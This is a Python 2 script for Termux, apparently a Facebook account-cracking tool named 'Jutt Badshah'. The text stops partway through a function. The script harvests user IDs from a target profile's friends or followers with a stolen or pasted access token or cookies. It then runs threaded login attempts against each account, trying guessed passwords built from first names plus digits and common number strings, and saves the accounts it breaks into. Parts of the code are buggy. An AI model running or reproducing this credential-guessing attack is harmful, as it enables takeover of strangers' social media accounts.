#!/usr/bin/python2
#coding=utf-8

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/home/jutt-badshah/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m'
    #os.system('xdg-open https://github.com/SHOOTER-MAKER')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/jutt-badshah/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\033[1;32m Welcome To Jutt Badshah Tool\033[0;97m'
    #os.system('xdg-open https://github.com/SHOOTER-MAKER')
    time.sleep(10)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)


##### LOGO #####
logo = """
\033[1;91m       ❣️❣️---------------------------❣️❣️")
\033[1;96m               💙 💙    💙 💙💙💙💙
\033[1;96m               🧡 🧡    🧡    🧡
\033[1;96m               💚 💚    💚    💚 
\033[1;96m               💜 💜    💜    💜
\033[1;96m               ❤️ ❤️    ❤️    ❤️
\033[1;96m              💙   💙  💙     💙
\033[1;96m         💜 💜       💜       💜   
\033[1;96m                  Jutt Badshah Updated 0.3;)                   
\033[1;91m       ❣️❣️---------------------------❣️❣️")
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\033[1;93mPlease Wait \033[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m       ❣️❣️---------------------------❣️❣️")
\033[1;96m               💙 💙    💙 💙💙💙💙
\033[1;96m               🧡 🧡    🧡    🧡
\033[1;96m               💚 💚    💚    💚  
\033[1;96m               💜 💜    💜    💜
\033[1;96m               ❤️ ❤️    ❤️    ❤️
\033[1;96m              💙   💙  💙     💙
\033[1;96m         💜 💜       💜       💜
\033[1;96m                  Jutt Badshah Updated 0.3;)                   
\033[1;91m       ❣️❣️---------------------------❣️❣️")
"""

jalan("\033[1;97m      ❣️❣️ NOT A NAME JUTT IS BRAND ❣️❣️")  


jalan("\033[1;91m       ❣️❣️------------------------------❣️❣️")     
jalan("\033[1;96m               Jutt Badshah Updated 0.3")                   
jalan("\033[1;91m       ❣️❣️------------------------------❣️❣️")
 
jalan("\033[1;93m INDAIN USERZ USE ANY PROXY ")	
jalan("\033[1;93m WIFI USERZ USE ANY PROXY ")
	
jalan("\033[1;96m Welcome to Jutt Creations ")

def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/nazeerjutt652/jutt-badshah/main/server.txt').text
    if to in r:
        os.system('clear') 
        print '\033[1;96mWelcome To Jutt Badshah Tool'
        time.sleep(10)
        log_menu()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ' \033[1;92mCopy the id and send to admin'
        print ' \033[1;92mYour id: ' + to
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923007574310')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \033[1;92mCopy And Press Enter Then Select Whatsapp To Continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to Whatsapp ')
    os.system('xdg-open https://wa.me/+923007574310')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;97m ~~~~ Login menu ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;96m[1] Login with Email Pass'
        print '\033[1;96m[2] Login with token'
        print '\033[1;96m[3] Login with cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \033[1;97m>>>Select ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\033[1;96mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\033[1;96m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\033[1;93m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \033[1;93mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print '\033[1;96mLogin with token\033[1;93m'
    print 47 * '-'
    tok = raw_input(' \033[1;96mPaste token here: \033[1;93m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;96mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\033[1;93mInvalid cookies'
        print ''
        raw_input(' \033[1;93mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\033[1;93mInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\033[1;93mInvalid cookies'
        print ''
        raw_input(' \033[1;93mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\033[1;96mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\033[1;93m Account Cheekpoint\033[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\033[1;92m Turn on mobile data/wifi\033[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print '  \033[1;97mLogged in user: \033[1;97m' + z
    print 47 * '-'
    print ' \033[1;93m Active token: \033[1;93m' + tok
    print ' ------------------------------------------ '
    print '\033[1;96m[1] Crack with Auto password'
    print '\033[1;96m[2] Crack with Number password'
    print '\033[1;96m[3] Crack with Name + Number password'
    print '\033[1;96m[4] Extract File'
    print '\033[1;96m[5] Logout'
    menu_s()


def menu_s():
    ms = raw_input('\033[1;97m>>>Select ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        os.system('python2 ok.py')
    elif ms == '5':
        lout()
    elif ms == '6':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \033[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;97m~~~~ Auto pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;96m[1] Public id cloning'
    print '\033[1;96m[2] Followers cloning'
    print '\033[1;96m[3] File cloning'
    print '\033[1;96m[0] Back'
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\033[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;97m~~~~ Auto pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;96m[1] Public id cloning'
    print '\x1b[1;96m[2] Followers cloning'
    print '\x1b[1;96m[3] File cloning'
    print '\033[1;96m[B] Back'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m>>>Enter ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\033[1;97m~~~~ Auto pass public cracking ~~~~\033[1;91m'
        print 47 * '-'
        idt = raw_input(' \033[1;97m>>>Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;97m~~~~Auto pass public cracking~~~~'
            print ' \033[1;96mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \033[0;97m'
            raw_input(' \033[1;93mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\033[1;97m~~~~ Name pass followers cracking ~~~~\033[1;91m'
        print 47 * '-'
        print ' \033[1;97mFor example:123,1234,12345,786,12,1122\033[1;91m'
        print 47 * '-'
        p1 = raw_input(' \033[1;96m[1]Name + digit: ')
        p2 = raw_input(' \033[1;96m[2]Name + digit: ')
        p3 = raw_input(' \033[1;96m[3]Name + digit: ')
        p4 = raw_input(' \033[1;96m[4]Name + digit: ')
        idt = raw_input(' \033[1;93m>>>Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;97m~~~~ Name pass followers cracking ~~~~'
            print ' \033[1;96mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \033[0;97m'
            raw_input('\033[1;93mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\033[1;97m~~~~ Auto pass File cracking ~~~~\033[1;91m'
        print 47 * '-'
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;97mJutt Badshah Start Cloning\033[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\033[1;96mJutt King Of Facebook\033[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass7
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass8
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '000786'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass9
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass10
                                                    cp = open('JUTT_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mProccess Complete'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \033[1;97mPress enter to back')
    auto_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \033[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;97m~~~~ Number pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;96m[1] Public id cloning'
    print '\033[1;96m[2] Followers cloning'
    print '\033[1;96m[3] File cloning'
    print '\033[1;96m[0] Back'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;97m~~~ Login FB id to continue ~~~'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;97m~~~~ Number pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;96m[1] Public id cloning'
    print '\033[1;96m[2] Followers cloning'
    print '\033[1;96m[3] File cloning'
    print '\033[1;96m[B] Back'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m>>>Select ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\033[1;97m ~~~~ Number pass Public cracking ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;97m For example:234567,223344,334455,445566\033[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;96m[1]Password: ')
        pass2 = raw_input(' \033[1;96m[2]Password: ')
        pass3 = raw_input(' \033[1;96m[3]Password: ')
        pass4 = raw_input(' \033[1;96m[4]Password: ')
        pass5 = raw_input(' \033[1;96m[5]Password: ')
        pass6 = raw_input(' \033[1;96m[6]Password: ')
        idt = raw_input(' \033[1;97m>>>Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;97m ~~~~ Number pass Public cracking ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \033[0;97m'
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\033[1;97m~~~~ Number pass followers cracking ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;97m For example:234567,223344,334455,445566\033[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;96m[1]Password: ')
        pass2 = raw_input(' \033[1;96m[2]Password: ')
        pass3 = raw_input(' \033[1;96m[3]Password: ')
        pass4 = raw_input(' \033[1;96m[4]Password: ')
        idt = raw_input(' \033[1;97m>>>Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;97m~~~~ Number pass followers cracking ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \033[0;97m'
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\033[1;97m ~~~~ Number pass File cracking ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;97m For example:234567,223344,334455,445566\033[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \033[1;96m[1]Password: ')
        pass2 = raw_input(' \033[1;96m[2]Password: ')
        pass3 = raw_input(' \033[1;96m[3]Password: ')
        pass4 = raw_input(' \033[1;96m[4]Password: ')
        pass5 = raw_input(' \033[1;96m[5]Password: ')
        pass6 = raw_input(' \033[1;96m[6]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;97m~~~ Jutt Badshah Start Cloning ~~~\033[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\033[1;96mJutt Badshah King Of Fcebook\033[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
